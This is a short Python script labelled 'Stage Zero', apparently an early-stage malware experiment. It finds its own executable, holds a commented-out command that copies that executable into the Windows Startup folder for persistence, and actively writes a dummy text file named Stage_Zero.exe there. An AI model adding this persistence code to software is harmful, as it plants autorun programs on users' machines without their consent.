## Stage Zero 
import os
import sys
import subprocess




def StartupPath():
    return f"C:\\Users\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"




def application_path():
    # determine if application is a script file or frozen exe
    if getattr(sys, 'frozen', False):
       application_path = os.path.dirname(sys.executable)
    elif __file__:
       application_path = os.path.dirname(__file__)
    return application_path



## if malware is frozen ,continue execution.
if getattr(sys, 'frozen',False):
   ## get .exe file
   onlyfiles = [os.path.join(application_path(),f) for f in os.listdir(application_path()) if os.path.isfile(os.path.join(application_path(), f))]
      
   for executable_file in onlyfiles:
      picked_file = executable_file.split(".")
      if picked_file[-1]=="exe":
         Stage_Zero_Path = executable_file
         break
   
   ## add Stage_Zero to startup
   ##stage_name="\\Stage_Zero.exe"
   ##c = f'copy "{Stage_Zero_Path}" "{StartupPath()+stage_name}"'
   ##os.system(c)

   ## resources
   ## https://blog.sonatype.com/intro-to-malware-analysis-analyzing-python-malware


   path = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','Stage_Zero.exe')
   with open(path,"w") as out_file:
      out_file.write("Stage_Zero say heloow")






